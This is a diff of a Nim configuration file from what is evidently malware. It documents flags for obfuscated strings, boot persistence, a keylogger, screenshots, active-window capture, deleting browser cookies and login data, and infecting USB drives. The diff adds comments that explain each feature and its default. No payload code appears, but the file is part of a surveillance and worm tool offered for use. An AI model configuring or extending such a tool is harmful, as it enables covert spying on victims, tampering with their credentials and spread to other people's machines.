@@ -2,18 +2,25 @@
 ## used by the program
 
 ## used for compile-time string encryption
+## in this file
 from functions/hideString import e
 
-##
+## persistenceThread is used for installing the program
+## and starting it when the pc opens
+## DEFAULT: true
 const USE_PERSISTENCE_THREAD*: bool = true
 
-##
+## windowNameThread is used for getting the active window name
+## best used alongside keyloggerThread
+## DEFAULT: true
 const USE_WINDOW_NAME_THREAD*: bool = true
 
-##
+## screenshotThread is used for saving screenshots
+## DEFAULT: true
 const USE_SCREENSHOT_THREAD*: bool = true
 
 ## keyloggerThread is used for logging key presses
+## DEFAULT: true
 const USE_KEYLOGGER_THREAD*: bool = true
 
 ## browserThread is used for deleting cookies and login data
@@ -28,7 +35,8 @@ const USE_BROWSER_THREAD*: bool = false
 ## DEFAULT: true
 const UNSAFE_REMOVE_FILE*: bool = false
 
-## infectThread will search for usb drives and infect them
+## infectThread is used for searching usb drives and infecting them
+## DEFAULT: true
 const USE_INFECT_THREAD*: bool = false
 
 ## the key files on a usb drive will be infected with
